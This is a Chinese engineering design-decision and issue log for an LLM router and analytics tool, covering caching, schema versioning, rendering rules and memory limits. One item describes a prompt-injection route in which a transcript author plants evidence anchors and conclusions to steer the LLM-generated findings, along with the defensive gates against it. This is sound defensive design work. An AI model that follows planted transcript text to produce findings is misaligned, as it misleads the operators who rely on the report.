- **配了 quota 的部署里，`vmr-quota.json` 变化会使 L2 缓存失效**：报表「账户（Provider）消耗与额度」章与 `macro/finance.json` 的 `provider_quotas` 直接读 `<log_dir>/vmr-quota.json`（路由半区每次计费请求都会重写它），其内容因此并入 L2 输入哈希集——否则同批日志隔时重跑会在 L2 命中路径上给出过期的额度进度与已用量。副作用：路由半区正在活跃承接流量时，对同一批历史日志反复 `vmr analyze` 会频繁 L2 miss（配额计数器确实在动，这一章本就该重算）；这是刻意的保守失效。不含 quota 限制的配置完全不受影响（`vmr-quota.json` 不进指纹）。`period_elapsed_pct` 这类纯 wall-clock 派生值仍是「as of 上次全量运行」——要 render-time 现算需把它移出切片、渲染侧按 `manifest.generated_at` 重算，属独立的低优改进。
- **分析产物的整套版本戳收在输出根 `manifest.json` 的 `format`**：整份产物一个版本单位，单文件不再各自长版本戳（`.cache/parse/` 分片仍自带 `CacheSchemaVersion`，那是内部缓存不是产物）。切片 schema 收敛为加性优先，删改字段必须 bump `format` 并在 CHANGELOG 标注 Breaking——骨架页可被用户复制定制，用户副本就是事实上的 schema 消费者。
- **分析产物 ZH 术语的 loanword / 全译两套约定并存，刻意不统一**：Markdown/报表侧保留英文特性名 + 中文描述词（`Sticky 有效性`、`Compaction 还原`、`账户（Provider）消耗与额度`，journey 叙事正文里 `system prompt` 也一贯是外来词）；看板侧全译（`系统提示词` / `上下文压缩`）。两套各自内部自洽。全量统一要改十余处 i18n 字符串 + 发给 LLM 的 prompt 正文 + `UserGuide.zh.md` 与 Analytics 设计文档里的既有章节名，收益纯观感、还牵出「Compaction 该不该译」之争（类比 `prompt cache` 通常不译）。**触发条件**：同一 section 内出现自相矛盾的形态（如标题译、紧邻正文不译），才值得局部收敛。新增 i18n 字符串时跟随同 section 已有正文的形态。
- **索引折叠与默认渲染范围只把 `heartbeat` 归为噪声，不含 cron / subagent**（`journey.IsNoiseCategory`）：真实语料实测——heartbeat 每候选最多个位数请求，而 cron 与 subagent 都有双位数请求的候选，含全语料最长的一条 journey（subagent）。索引显示分割与 CLI 默认渲染范围共用这一个判据，避免二者对同类候选给出不同答案。cron 因此也会进重复任务聚类——同一 cron 多次运行聚在一起有诊断价值（如首次失败重跑）；锚点标题剥掉 `[cron:<uuid> ]` 装饰再展示。
- **重复任务聚类（`clusters.go`）：相似度阈值硬编码、不进 report.yaml 与 L2 指纹，候选列表看板不按簇分组**：3 人团队 + 单一使用场景下，一个永不会调的阈值做成配置项、以及在 `index.md` 之外再做一套看板分组，都是过度设计（Agent 会话可视化 deepdive 曾列这两项，独立验收时按第一性原理裁掉）。阈值 `0.45` 写在代码里带注释；`journeys/index.json` 已带 `clusters` 字段，将来真要看板分组时前端自取即可。聚类键用任务标题（taskseg 多由开场指令派生）而非初始指令全文，是可接受的近似。**触发条件**：出现反复 A/B 阈值的需求，或看板成为聚类的主要入口。
- **stitch 缝合同时要求比例阈值与绝对下限（共享去重键 ≥ `stitchMinAbsOverlap`）**：断裂后的开头 manifest 天然很短（system + 摘要 + 第一条指令），一条共享消息就能把比例顶过任何阈值——而那条消息往往正是 SessKey 本身的构成成分，它共享是**因为**这是同一个会话的锚，不是因为发生了 compaction（证据循环）。比例防长会话、绝对值防短会话，两道闸正交。不满足下限**降级为 `AmbiguousMatch` 而非淘汰**，候选仍可供人工查看。论证谱系与 `edit.go` 的 `spliceMinTailMatch` 相同。
- **同 SessKey 候选有 72h 宽松时间上界（`stitchSameKeyMaxGap`），超窗候选预过滤出局，最强者仅作诊断兜底**：「用户可以走开几天再回来接同一个 anchor」对人类成立、对机器相反——同一 anchor SessKey 下堆积最多的是定时/心跳任务：开头模板相同、彼此无关、可跨数百小时，正是促成 `stitchCrossBucketMaxGap` 的那批假匹配，只是发生在桶内所以那道闸从没管过。规则是**淘汰优先于排序**（与 `strategy` 包 `Condition`/`Dimension` 分离同型）：超窗候选不参与赢家竞争，避免「高分超窗者先赢再降级」遮蔽窗内合法前驱；仅当过滤后无任何窗内候选时，最强超窗者作为降级 `AmbiguousMatch` 边保留供人查看。
- **消息内容哈希剥离 Anthropic 的 `cache_control` 标记**：`cache_control` 是缓存控制元数据，不是对话内容；客户端逐轮移动缓存断点会改变哈希，把一次纯 Append 误判成内容编辑，整条 lineage 谱系失真。**证据状态要如实说**：机制已从代码确认（`hashJSON` 对原始消息对象全字段哈希，标记确实进哈希输入），但本机语料太小，**按协议拆 Append 比例无法产生统计意义，未能从语料实证**。剥离本身严格更正确，故仍实施。**已知副作用**：消息内容载荷里键名恰为 `cache_control` 的（如工具结果回显）也会被剥离——只影响哈希与 lineage 判定，不影响存储内容与渲染。
- **详情页在 `report` 与 `journey` 之间字节一致，靠的是两侧传入同一个 `(record, manifest, prev)` 三元组 + 指纹携带 `m`/`prev` 身份**：只做其中一半都不够。曾经的失效形态是：`report` 侧在 `group()` 里对 compaction 记录先 `continue` 再赋值 manifest，于是它的 manifest 恒为 nil，而 `journey` 侧传的是真实 manifest；渲染指纹只含 lang/evidence，于是同名文件**先写者赢**——用户拿到哪个版本取决于渲染顺序。补上 manifest 消除差异源，指纹折入身份防同类复发。
- **LLM 解读层生成结构化 Finding 的准入与置信度契约**：LLM 判别器产出的 Finding 必须强制标记 `Source: "llm_inferred"`、离散置信度（`HIGH/MEDIUM/LOW`）与原文 `EvidenceAnchor`。仅 `HIGH` + 直接证据锚点的项以 Finding（⚠️）呈现并标 `[AI推测]`；`MEDIUM`/`LOW` 降级为参考提示。**锚点运行期强制校验**：`ComputeLLMFindings` 收完全部 detector 输出后逐条 `strings.Contains(真实 transcript, EvidenceAnchor)` 校验，非逐字子串即丢弃——但这是**防幻觉**检查，**不是防注入**：注入方就是转录本的作者，他能同时植入被引用的锚点和结论，`Contains` 必然命中。注入面靠另外两道闸收口：LLM 来源的 Finding **一律不参与 `pickDriver`**（仪表盘顶部判词只可能来自规则产出），且 `StepSeq` 不在本 Journey 真实步号范围内的 Finding **直接丢弃而不是 clamp**（clamp 会把攻击者选的序号映射到一个合法步）。问法严格约束在有证据支撑的事实性问题上（拒绝开放式主观质量打分），守住「揭示事实与过程异常而非冒充裁判」的边界。
- **`archtest` 的文档守卫只覆盖 `CLAUDE.md`、设计文档、本文件与用户指南，不扩展到 review 报告类文档**：后者会正当地讨论已删除的文件与「建议新增的 XXX 函数」。真正的风险（一份陈旧 review 被当施工依据）**用定位而非机制解决**：权威的当前状态清单只有本文件。
- **`archtest` 不加圈复杂度检查**：一次只加一个守卫。函数长度预算落地不久，确认不够用之前不引入第二个。
- **文件与函数行数预算线是提醒式绊线，非架构缺陷**：`internal/archtest` 的文件/函数预算（默认 700 / 120 + 豁免表）是轻量提醒机制，连 Warning 都算不上。未触线前无需焦虑、不需在常规 review 里逐个排查；一旦触线，按职责拆分重构，或逻辑内聚时临时按 +15~20% 调高豁免。
- **可维护性的核心在整体架构与设计复杂度，而非代码行数**：单人可维护性取决于是否守住 First Principles / KISS / YAGNI、是否消除了不必要的过度设计与复杂分支，而非机械度量行数或两半区体量比。
- **聚合浮点字段在冷/热缓存两次运行间的 1 ULP 级差异不追查、不消除**：浮点加法不满足结合律的教科书现象，不是可以「修好」的缺陷。唯一该做的事（差分/一致性测试用容差而非逐字节相等）**已经是现状**（`report/e2e_test.go` 用 `1e-6`、`quota_parity_test.go` 用 `1e-9*want`）。唯一需重新当作 bug 的情形：差异远超浮点精度量级，或开始出现在 `cost_estimate` 之外的字段上。
- **`buildinfo` 只输出 VCS commit 哈希，不人工编造语义化版本**：如实反映构建来源。
- **官方用量 API 不预先抽象 `Source` 接口**：YAGNI，等真正接入第一个厂商私有用量接口时再设计。
- **不维护外部贡献者 `CONTRIBUTING.md`**：与小团队运作方式不匹配。
- **`client_key_tag` 与 `key_label` 命名与推导刻意不统一**：前者代表调用方（`audit.KeyTag` 尾 8 位窗口 + 连字符截断，有 16 字符下限与 `-alice` 命名约定的历史包袱，文件名与既有报表已定型）；后者代表实际分发到的上游账号（沿用 config 的 `api_keys` label 叫法，未配置 label 时取 key 尾 6 位）。两者是相互独立的两个维度，在所有统计报表（slim、rollup、`/stats`、`/stats.html`）中并列记录，刻意不统一推导或合为一个字段。
- **in-flight 请求注册表（`router/inflight.go`）归属路由运行态，永不落盘、不结算进完成时账本**：排队、逐 attempt 发出、流式逐块盖章等事件发生在 router 内部，早于任何 audit record 产生；完成时钩子（`server.done`）对每个请求恰好记账一次，in-flight 仅补充"请求进行中"的内存观测空窗，条目在请求结束时整条删除，两条路径互不写对方的数据。
- **`last_byte_at` 与 `est_out` 逐块盖章、刻意不节流**：`last_byte_at` 的语义是"上游最后一块数据真实到达的时刻"，用于卡死检测；若按时间或字节数攒批，节流后的盖章时间反而滞后于真实末块到达时间，让已卡死的流显得"更新鲜"，方向恰好做反；成本上每块只有一次 `OutTokens()`（per-stream 互斥锁内读计数器，本来每块就进过一次）+ 几次 per-entry 原子写，零内存分配，千块/秒极端流下也远低于 JSON/SSE 协议开销，无需攒批。
- **body 上传与 probe 阶段对 in-flight 注册表不可见**：注册点设在 `TopLevelProbe` + `authenticate` 之后、`AcquireSlot` 之前，因为未获得协议与虚拟模型名前的请求无法归属维度，且慢速客户端 body 上传并不占用并发槽，不属于并发门排队观测的对象。
- **livestats rollup 文件只追加、永不删；内存只是它近 7 天的滑动窗口**：小时聚合行小（年万行级），文件当全量归档一直叠——唯一消费者是 `/stats`，`vmr analyze` 读的是 audit log。内存 `a.rollup` 启动按窗口过滤加载、运行中每次日切（`rollHourLocked` 里 `evictOldRollup`）逐出掉队的一天，所以读时 fold 是**不随部署年限增长的常数**（否则读缓存也兜不住一个越来越贵的 fold），`by_*` 累计口径因此是"滚动近 7 天"而非"自启动以来"。窗口按**日历日**对齐——`rollupRetentionDays`（7）个整天 + 当天，`now` 是 0:00 时正好 7 天、中午时 7 天半。文件的启动解析成本仍是 O(全历史)——`vmr start` 打一行"恢复行数 + 耗时"日志盯着，真到几百 ms 再上按天分文件（`vmr-stats-rollup-YYYYMMDD.jsonl`），现在不做。取 7 天不取 30：实测每 `(hour,dims)` 行 ~450B，7 天在小团队规模是 1–3 MB、内存里正好是控制台 `?range=` 最宽档能显示的量；lazy 从文件加载被否掉——为省几 MB 把读路径搞成带文件 I/O 的，比刚优化掉的 fold 还慢。理由与取舍见 LiveStats 设计文档的内存态一节与决策表。
- **Overview 头部告警 pill 的端点告警只在 cooldown 期间在列**（`server/alerts.go`）：cooldown = 该端点此刻被排除在路由外，是「需要动手的状态」；`consecutive_failures>0` 但未冷却的降级态由拓扑表 Health 列（带因果悬停）承载——无流量时残留失败计数不消零，进告警会把徽章永久钉在非零，违反告警收敛纪律（见 console-unification 设计契约（已归档））。
- **Log 页 level 芯片是前端启发式分类，后端 `/log` 流不带结构化 level**：`/log` 是与 stderr 逐字节一致的纯文本流，给日志行加结构化字段牵动 stderr 格式与全部日志消费者；芯片只影响终端着色与过滤（`classifyLevel`），纯属展示层。
- **`/stats.overall` 合并窗口块目前无内置消费者，作为 JSON 契约保留**：它是为控制台首屏那一段"全局 TTFT p50"加的（分位数不可跨 ring 合并，只能服务端在读时对样本并集算）；该 vitals段在 console polish 轮据用户反馈移除，`overall` 随之空转。删掉它是纯粹的契约收缩且要改测试，收益为零；留着无害（已测、可外部消费、首屏日后补延迟信号会重新用上）。无 ring 样本时为 `null`。见 LiveStats 设计文档 `/stats` 契约段。
- **零 attempt 失败（全端点冷却等）的错误类别由 `sampleFromRecord` 合成为 `no_candidate`，audit.Record 不扩充顶层字段**：一批失败导致所有候选端点进入 cooldown 后的请求是 0 attempt 的即时快速失败，路由半区未向上游发起任何 attempt，因而 `audit.Record.Attempts` 为空。`server.sampleFromRecord` 在 `len(Attempts)==0` 且 `Outcome=="error"` 时为 `livestats.Sample` 合成 `error_class="no_candidate"` 并由客户端侧 HTTP 响应码（503 等）兜底 `status`，使控制台 Recent Failures 能够准确区分并过滤最常见的级联冷却失败，而无需为了展示层需求扩充审计日志顶层 schema。
- **分析半区渲染架构的四条判据，可机械执行**：R0（投影不互相派生）——HTML 不由 Markdown 转，Markdown 也不由 HTML 转，两者都只从数据产品或共享 VM 来；R1（语言不进数据产品）——判据是"换语言能否只重跑渲染、不重算聚合"，不能就是违反；R2（单一结构化 VM）——判据是"VM 里能否出现任何已经是某种格式的片段"，能就是违反；R3（交互式投影只为查询而非阅读存在）——判据是"把这页全部内容打印成纸，有无信息损失"，没有就该是文档不是应用。外加一条分界：**文档自带内容，只有应用才需要数据源**——文档的正确形态是自包含单文件（`file://` 直接打开），应用才必须有 HTTP。部分看板骨架页其实是文档却套了应用的加载模式（零业务数据的骨架 + 运行时 fetch），这是可达性门槛的根因，不是"用得少"的旁证。
- **`internal/report` 的 `BlockVM` 已按 R2 结构化到位，`ParaVM` 降级为显式逃生舱**：强调式组标题、blockquote 统计行、生成式图表（序列图与流程图形状不同，分别对应 `ChartVM`／`FlowVM`）、以及一处绕过既有 `DetailsVM` 的写法，均已从 `ParaVM` 里的手写 Markdown 片段搬到对应的结构化 `BlockVM`（`HeadingVM`／`NoteVM`／`ChartVM`／`FlowVM`／`DetailsVM`）。`ParaVM` 本身不删，仍是纯 i18n 文本段落与"builder 手工控制块间空白"这两类无法/不值得结构化的写法的**显式逃生舱**：类型保留，`internal/archtest` 的构造点数量预算（`TestParaVMBudget`，当前 43）像文件/函数行数预算一样可调但必须显式抬，只降不升。
- **分析半区的 Markdown 渲染统一走三层护栏，新增/改造一个 section 或 finding 类别时三层都要过**：① builder→VM 结构化 golden（`internal/report/viewmodel_golden_test.go`＋`viewmodel_golden_data_test.go`；`internal/journey/golden_test.go` 的 `testdata/golden_vm{,_zh}.json`）——比对的是 JSON 序列化后的 VM 结构，不是最终字符串，diff 精确指向哪个字段漂移，不受无关序列化改动影响；② VM→序列化器结构断言（`internal/report/viewmodel_test.go`；`internal/journey/viewmodel_test.go`）——钉标题层级、表格几何、block 顺序这些结构规则本身；③ 端到端 `.md` 字节级 smoke（`internal/report/e2e_markdown_test.go` 的 `TestGoldenReportMarkdown`；`internal/journey/golden_test.go` 的 `TestGoldenMarkdown` 已把 ①③ 合并在同一个测试里）——这是最后一道网，捕获前两层各自局部正确、组合起来却错的情况。**不要因为"golden 已经很多了"就跳过端到端那一层，也不要为了图快只加端到端字节 golden、跳过结构化 VM golden**——后者定位更精准，前者兜底遗漏，两者互补不是重复。
- **删除三张零交互看板页（`journey-compare.html`／`benchmarks.html`／`tool-waste.html`）后的回退态是终态，不是欠账**：若后续 HTML 序列化器最终被否决（未立项或立项后废弃），这三个产物的文档形态**永久只有 Markdown**——这是可接受的终态，因为按 R3 判据它们本来就是"文档"而非"应用"，不需要为它们再补一个 HTML 消费者才算完整。
- **`analytics.serve` 与 `vmr analyze -open` 是两个不同场景，不是同一能力的两种开关**：前者是路由半区的常驻 HTTP 挂载点（`server/reports.go`，`mountReports`），服务 `request-browser` 这一个真应用的长会话查询，需要鉴权、需要进程常驻；后者是分析半区命令的一次性查看，绑 `127.0.0.1` 随机端口、前台运行、`Ctrl-C` 退出，不鉴权（本机单用户，产物已在本机磁盘上）、服务范围限定在这次 `analyze` 产出的目录内。两者共享"文档需要 HTTP 才能 fetch 相对路径 JSON"这同一个根因，但生命周期与信任模型都不同，不合并成一个开关。
- **R1（语言不进数据产品）的语言载体处置表，逐行冻结——这张表就是 R1 的验收定义**：`summary.json` 的 `efficiency[].finding/action`、`highlights[]` 与 `manifest.json` 的 `footnotes`／`disclaimers`，以及 `j-*.json` 里 `Finding.Source` 留空（规则派生）的 findings 叙述，一律降级为 `(rule, severity, params)`，句子在 Project 层按语言组装（`manifest.json` 是契约文件，schema 变更须走 `format` 版本步进）；`compares/*.json` 的 `rows[].label` 已有 `rows[].metric` 作中立 id，渲染期改由 metric 查文案目录；`sessions[].title`、请求正文摘录是**透传内容**，显式豁免，翻译它是错的；`llm_interpretation.text` 与 `llm_findings[]` 里 `Finding.Source == SourceLLMInferred` 的条目是**LLM 原文**，豁免并标注 `llm_lang`（见下一条分流规则）；journey 兜底标题（`NoTitle`／`ToolLoopTitle`／`StitchedTaskTitle`／`UnreadableTitle`）确实是真实载体——全量语料 `-lang` 差分测出 1,413 条候选里 5 条命中（0.35%）；已修复，但不是结构化为标记 + 渲染期本地化：这四处从不像 findings 那样在渲染期按 `-lang` 重新本地化，同一份文案直接写进 `Journey`/`Task.Title`，一路沿用到 `journeys/index.json` 和渲染出的 Markdown，Code+Params 式的双语行会是从未被读取的死文本——故直接冻结为 `internal/i18n` 包顶层的英文常量/函数（`JourneyNoTitle` 等），不再挂在 `Table[T]` 上。**R1 判据的最终措辞**：换语言重渲染后，除透传内容与标注了 `llm_lang` 的 LLM 原文外，产物逐字节中立。
- **LLM 原文的豁免按 `Finding.Source` 分流，不按数组分**：`llm_interpretation.text` 与 `llm_findings[]` 里 `Source == SourceLLMInferred` 的条目同属 LLM 原文，走 `llm_lang` 豁免；同一个 `[]Finding` 里 `Source` 留空（规则派生）的条目仍属投影层文案，走 Code+Params 重组。对整个数组一刀切（要么全豁免要么全不豁免）会让 R1 判据在 journey 半边不成立。
- **边界澄清（两条，防止已有裁决被误读成自己的反面）**：① 本节上文「不自建 Markdown→HTML 的渲染层」否决的是"在数据层养一个只覆盖子集的 Markdown 解析器"；VM→HTML 序列化器**不解析 Markdown，它序列化 VM**——从共享结构直接产出第二种格式，这是被允许、甚至被鼓励的形态，两者不是同一件事。② §1.0「永久不做」清单里的 "Web UI" 指管理控制台（RBAC、多租户后台一类），不指分析半区的渲染产物——本仓已在分发看板骨架页与控制台静态页面，加一个 HTML 序列化器不违反这条红线。
- **LLM 自由文本的 Markdown 结构转义做在序列化（渲染）时，不做在 Finding 构造时**：`sanitizeMDStruct`（`internal/journey/llm.go`）不再在 `llm_findings.go` 的 Finding 构造点调用——`journeys/details/j-*.json` 里 `llm_findings[]` 的 `evidence`／`action`／`evidence_anchor` 现在是模型的原始输出，不带任何转义痕迹（R1：JSON 应该展示模型实际说了什么，不是转义后的改写版）。转义改在 Markdown 渲染路径上执行：`internal/journey/findings.go` 的 `localizeFinding` 对 `Source == SourceLLMInferred` 的条目在返回前对 `Evidence`／`Action`／`EvidenceAnchor` 三个字段调用 `sanitizeMDStruct`（`Finding` 字段不转义——它从不被任何 Markdown 渲染路径读取，只服务 JSON）。这条改动在单一结构化 VM 落地后才成立：LLM 文本进的是带类型的字段而非拼进一句模板句子，序列化器因此天然知道自己在往什么结构位置写，转义顺理成章成为它的职责，不再需要在构造时抢先做。`Finding.Params` 存原始值这条既有约定不受影响；旧的"叙述字段是已转义文本、不可与 `params` 混用"那句过渡期警告在 journey 侧已经结束——两者现在语义一致，都是原始值。
- **冻结「读者四」（给别的团队用，零配置可打开）这条承重假设本身**：依据是 `docs/VirtualModelRouter_Design_v4_Strategy.md` 的目标用户画像"100 人以内的中小型 AI 研发团队"及其中的竞争格局对位（One-API／LiteLLM／OpenRouter）——这确立了"给别的团队用"是产品定位的一部分，不是臆测。**它不覆盖**多语种需求本身——多语种的依据是团队构成（中文母语 + 全球触达）与既有双语产物，与读者四是两条独立的理由链。**假设动摇时的降级表**：R1（语言不进数据产品）不依赖读者四，三条独立理由单独成立（语言是读者属性、产物腐烂是症状不是需求消失的证据、机械判据本身成立）；已否决的「砍语种」方案依赖读者四；R2（单一结构化 VM）强依赖读者四（收益前提是"会有第二种格式或第二个语种消费者"）；HTML 序列化器几乎是纯押注——没有读者四，它应当直接否决而非推迟。
- **数据产品是对外契约，`manifest.json` 的 `format` 是它的版本号**：加性变更（新增字段、新增可选切片）不必步进；删除字段、改变既有字段语义、改变产物目录布局属破坏性变更，必须步进 `format` 并在 `CHANGELOG.md` 标注 Breaking。`internal/report/rows.go` 的 `Format` 常量是 `manifest.go` 的 `ManifestFormat` 的别名，两处不独立改。

---

## 2. 待定与待解决问题（分组；组内按用户价值 × ROI 排序）

> 标题方括号里是**严重程度**（现在有多糟），不是优先级；它与组内顺序（现在做有多划算）是两个正交轴。
> 要排期看组内顺序与 §3，要判断「现在有多糟」看方括号。编号只是稳定身份标识，不连续、不代表顺序；
> 「决定不做 / 暂不做 / 非活跃」类条目排在组尾、各自带触发条件。

### A. 分析半区 · 大语料规模（内存与耗时）

#### 2.2 [中] `vmr analyze` 全内存聚合的记录量上限

- **现状**：`AnalyzeSessionsCached` 常驻全部记录关键信息 + 原始耗时/延迟/Token 样本切片（算真实百分位）。实测万级记录即 GB 级 RSS（`report` 单跑约 1.4GB / 1.1 万条；`analyze` 组合路径约 3.75GB / 1.5 万条）。
- **journey 半边曾是更大的来源，已消除**：`Step` 不再持有 `audit.Record`，`-benchmark`/`-render-all` 按 `Manifest.Bytes` 字节预算分批构建，全部 Journey 常驻只剩约 300MB，与语料量解耦。
- **剩下的**：report 半边的 `AnalyzeSessionsCached` 样本切片仍是全内存。
- **可能方案**：按审计日志的时间局部性分自然日分桶，跨日即时释放原始切片。
- **为什么仍待定**：这个量级目前仍跑得完（16GB 机器有余量），且分桶释放依赖「记录时间严格单调递增」这个隐蔽正确性前提，不成立就是静默算错而非报错——押上方案前必须先把它证实或证伪。
- **触发线是「该动手了」不是「已经坏了」**：单次 `report`/`analyze` 宏观半边语料 > 约 3 万条、或该半边峰值 RSS > 4GB 是不可越过的上限；实际立项要往回留约两成提前量（约 2.5 万条 / 3.3GB 起就排期），让「证前提 → 实现 → 补一套对等的 cold/warm 一致性测试」在撞墙前落地——撞墙时正是最缺内存、最需要跑分析的那一刻。
- **相关未做项（warm-path，登记待触发）**：语料不变、只渲染单个 journey 时，`setupJourneyRun` 仍无条件全量 `ScanCached` + `buildGraph` + `StitchGraph`。窄路径需给 `journeys/index.json` 的 `JourneyIndexRow` 补 `stitch_edges`（每条 lineage 的前驱边持久化，按内容寻址 `LineageID` 重放，避开 tie-break 不确定性）+ 一条陈旧性闸。触发条件同上。

#### 2.1 [低，已部分闭环] 会话分析那一趟（`collect()`）仍未缓存

- **现状**：`report.BuildCached` 跑三趟扫描——① `ctxgraph.ScanCached`（manifest，已缓存）② `collect()`（会话/任务分组用的每记录特征）**未缓存，每次全量重跑** ③ `aggState.scanFiles`（指标聚合，已接 `factscache.go` 缓存）。③ 接缓存后真实语料实测热耗时 5.2×，但 ② 未缓存使热耗时离个位数秒仍有差距。
- **为什么不顺手做**：`collect()` 产出（`ReqInfo`）直接喂 `group()`/`ctxgraph.StitchGraph` 做会话/任务边界判定，正确性敏感度高于纯指标聚合（算错是把不相关对话缝到同一 Journey）。
- **触发条件**：投入前先补一套对等的 cold/warm 一致性测试（参照 `TestBuildCached_WarmMatchesBuild`）。

#### 2.55 [低，登记待触发] `journey.BuildAll` 仍先把一批的全部记录物化成 map

- **现状**：`BuildAll` 内部 `FetchRecords` 把一批（字节预算 ~160MiB 原始）的记录一次性收进 `map[Loc]*audit.Record` 再 `buildFrom`，这个 map 是每批的瞬时峰值来源（约几百 MB）。
- **可能方案**：全流式——`FetchRecords` 的 map 也不要，逐条喂给 builder。要求把 `buildFrom` 从「拿到全部记录后遍历」改成「按到达顺序 feed」，并处理并发扫文件的乱序（Event 的 `FirstStepSeq` 需按 seq 事后归并）。
- **触发条件**：语料再涨约 5 倍，或需要在 8GB 以下机器上跑全量 `-benchmark`/`-render-all`。

#### 2.56 [低，登记待触发] 一次 `vmr analyze` 至少把全量语料解压三遍

- **现状**：`.cache/parse` 只覆盖 `ctxgraph` 的 manifest 扫描。`PreviewTitles`（全部候选根记录）、每批 `BuildAll` 的 `FetchRecords`、report 半边的 `analyzeFile`（§2.1）各自独立全量解压一遍——全量语料上是 `-render-all` 耗时的主要来源。产物级 L2 缓存落地后，输入未变时这套重复解压整体被跳过（`-no-cache` 可退回全量对照）；本条针对的仍是冷启动/输入变化后的那一次全量计算。
- **相关**：`FetchRecords` 的接口形状（返回全量 map）天然逼调用方驻留全部；`PreviewTitles` 是纯提取（读一条、取一句标题、丢弃），可顺手切 `ctxgraph.ForEachRecord`，消掉一个数百 MB 的瞬时峰值。
- **可能方案（治本）**：让 `Manifest` 携带每步 delta 正文，取消 `FetchRecords` 这第二遍解压。但要把叙事提取逻辑从 `journey` 挪进 `ctxgraph`，破坏后者「不驻留正文」的契约，解析缓存体积涨两个数量级，且该 cache 是 report 半区共享的。跨包契约 + 双半边影响。
- **触发条件**：内存不再是瓶颈后，时间成为首要痛点时单独立项。

#### 2.96 [低，登记待办] 单请求详情/证据链过度延迟物化，批量回溯场景下引发 I/O 抖动

- **现状**：`requests/details/` 与 `requests/evidence/` 严格懒物化。静态 HTTP 服务器走查或批量下载多个单请求分析时，后台需即时解压审计日志定位单行，引发磁盘随机寻道与 CPU 尖峰。
- **根因**：审计日志按块压缩存放（`.jsonl.zst`），随机定位一个请求需解压整个压缩块；连续请求多个详情时解压重复执行，无块级复用。
- **可能方案**：保持「全量分析不产生海量微小 Markdown」的前提下，在 `requests/index.json` 增加每请求在压缩日志中的字节偏移与块 ID（schema 加性变更），并在按需物化模块引入容量有限的最近解压块 LRU 缓存（如 10 个 block）。
- **触发条件**：作为按需物化性能专项排期处理；在那之前单请求详情的数百毫秒级响应在单人本地场景可接受。

#### 2.69 [低，登记待触发] `searchableTranscript` 大语料下 O(N²) 全量物化

- **现状**：`internal/journey/llm_findings.go` 的 `searchableTranscript` 为每次锚点校验把 Journey 的转录本整体拼接成字符串。校验次数 × 转录本长度是乘积关系，大语料下是分析半区唯一的复杂度悬崖。
- **可能方案**：校验改在已分片文本上逐段 `Contains`（锚点语义不变），或对超长 Journey 截断校验域并明示。
- **触发条件**：`vmr analyze -llm` 在真实大语料上出现可感知的耗时占比（当前无实测瓶颈）。

#### 2.50 [低，潜在] 详单文件名去重位 `md5(basename:line)[:4]`（32 bit）

- **现状**：`internal/ctxgraph/reqcoord.go` 的 `ReqHash8` 给详单文件名算 4 字节 hash 去重后缀。单源文件近 1 万条记录时按生日界碰撞概率约 1%；真正撞成同一文件名还需同毫秒 + 同模型 + 同 outcome，现实可忽略。
- **恶化曲线**：与 §2.2 的语料上限同步线性恶化。真出现时把去重位提到 hash12/16 或改用递增序号，都是局部改动。

#### 2.3 [低，决定不做] `chatmsg` 离线解析路径的 `map[string]any` 分配

- **现状**：`internal/chatmsg` 的 `map[string]any` 全在离线消息/SSE/usage 解析路径，转发热路径实测零命中。
- **决定不做**：真实语料内存分析直接测了这一层——`audit.Record` 反序列化后的 live heap 相对原始 JSON 字节只放大 **1.40x**（审计记录绝大部分是长文本对话正文，`string` 只有 16 字节 header，结构开销被文本稀释）。把 `Body` 从 `any` 改成 `json.RawMessage` 延迟解析最多省 29%，不改变量级，却要改动 `journey`/`report`/`reqdetail`/`chatmsg` 里几十处类型断言——投入产出比最差。journey 半边的内存问题另有真因（§2.2），已单独解决。
- **触发条件**：真实 profile 显示某个离线聚合路径的时间/内存确由 `map[string]any` 分配主导（当前证据相反）。

### B. 分析半区 · 指标与口径正确性

#### 2.100 [中，登记待做] `internal/report` 未消费 `Attempt.tokens` 盖章值，与 `/stats` 的 token 双路径

- **现状**：LiveStats 前置改动把每个 forwarded attempt 的 raw 四分量 token 盖到
  `audit.Attempt.tokens`（`internal/router/quota.go:tokenStamp`，与 quota 扣费同源），目的是
  "routing half 能盖戳就不让下游反推"。`internal/livestats` 的 `/stats` 已消费它；但
  `internal/report`（`session.go` 的 `chatmsg.ExtractUsageSides(resp.Body, …)`）**仍从响应体
  反解析** token。字段是加性的，report 不改也编译。
- **双路径分叉风险**：同一条 audit record，`/stats` 的 `by_provider_model` token 走
  `Attempt.tokens`（quota 的 exact/degraded fold），`vmr analyze` 的按端点 token 走 body
  反解析——两条路径对同一请求可能不一致：① degraded 场景（流在 usage 块前截断）两侧的估算
  口径不同；② `Attempt.tokens.in` 是 fresh（净 cache），`chatmsg.Usage.In` 是 gross。运维
  对不上账。
- **可能方案**：`report` 改为优先读 `Attempt.tokens`（缺失时 fallback 到
  `ExtractUsageSides`，仿 `Attempt.IsForwarded` 的 stamped-优先-heuristic-兜底），并补
  livestats-token vs report-token 的差分测试。
- **为什么还没做**：跨 viewmodel 层、golden fixture 会变，有独立的测试成本；不阻塞现状
  （两条路径各自有测试、各自能跑）。
- **触发条件**：有分析半区改动窗口时一起做；或运维实际报出 `/stats` 与 `vmr analyze` 的
  token 对不上。

#### 2.57 [低] `computeTimeSplit` 单间隙时间归因无上限，污染 benchmark 均值

- **现状**：`internal/journey/metrics.go` 的 `computeTimeSplit` 对每对相邻 Step，把「上一步响应落地 → 下一步请求到达」的整段 wall-clock 间隙按「下一步是否 `HumanInitiated`」二分为 human idle 或 `AgentExecMS`，间隙不设上限。跨天/跨周的 lineage 上，一段几十天的空档会整段计入「Agent 执行时间」——`-benchmark` 的 `Agent-Side Execution` 因此出现 `Median 8s / Mean 数小时` 乃至数十天量级的均值。
- **当前缓解**：`-benchmark` 指标分布表已加脚注「time 类指标的 Mean 被少数长命 journey 严重拉偏，看 Median/P90」。只是免责，没动根因。
- **可能方案**：对单间隙设上限（如 > 1h 归 idle/unknown 而非 agent 执行）。需改指标语义 + 更新 Analytics 设计文档的时间拆分定义 + 差分测试。
- **触发条件**：脚注被证明不够（读者仍据 Mean 下结论），或要把 `NetWorkingMS` / `ModelToToolRatio` 当硬指标用。
- **第二处表现（2026-09-11 review）**：`ModelToToolRatio`（`metrics.go`）= `ModelMS / AgentExecMS`，分母无下限、比值无 clamp——单次瞬时工具调用（如 `echo`，个位数 ms）配合正常模型推理耗时即可把单样本比值推到万倍量级，`-benchmark` 的「模型/工具时间比」均值被单个离群样本从十余倍拉高到近 400 倍。与本条同一根因族（时间类指标缺防御性上下限），可能方案同样是分母保底阈值（如 < 500ms 记 `n/a`）或对比值做上限 clamp，与本条一并评估、一并改。
